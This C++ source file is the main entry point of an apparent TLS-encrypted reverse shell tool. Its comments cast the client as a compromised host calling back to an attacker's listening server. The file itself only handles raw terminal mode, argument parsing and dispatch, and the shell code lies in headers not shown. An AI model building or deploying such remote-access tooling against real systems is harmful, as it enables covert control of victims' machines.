#include "utils.h"
#include "args_parser.h"
#include "client.h"
#include "server.h"

// using termios and raw mode to allow us to
void setRawMode(termios &orig) {
    termios raw = orig;
    // disable line buffering so we can check input instantly
    raw.c_lflag &= ~(ICANON | ECHO);
    // setting min chars to read and timeout to 0 or no timeout
    raw.c_cc[VMIN] = 1;
    raw.c_cc[VTIME] = 0;
    // get the current terminal settings
    tcsetattr(STDIN_FILENO, TCSANOW, &raw);
}

int main(const int argc, char *argv[]) {

    /*  Program Layout
     *  User passes argument 'client' or 'server'
     *  'client' would be a compromised host attempting to connect back to attacker
     *  'server' would be an attacker waiting for a connection
     *
     *  if 'server' arg passed, we pass the IP address and port to listen on
     *
     *  if 'client' arg passed, we need the IPv4 addr and PORT number of the listening 'server'
     *
     *  then connect and set up an encrypted rev shell (using OpenSSL TLS)
     */


    // save original terminal settings
    termios orig;
    tcgetattr(STDIN_FILENO, &orig);
    // enable raw mode to allow for better use of arrow keys
    setRawMode(orig);


    struct config cfg = parse_args(argc, argv);

    // check if parser worked
    if (cfg.execType.empty() || cfg.portNum <= 0 || cfg.ipAddr.empty()) {
        exit(-1);
    }

    if (cfg.execType == "server") {
        server(cfg.ipAddr, cfg.portNum);
    }
    else {
        client(cfg.ipAddr, cfg.portNum);
    }

    // both client and server should break and reach here before exiting.
    // TODO: catch ctrl+C
    tcsetattr(STDIN_FILENO, TCSANOW, &orig);

    return 1;
}

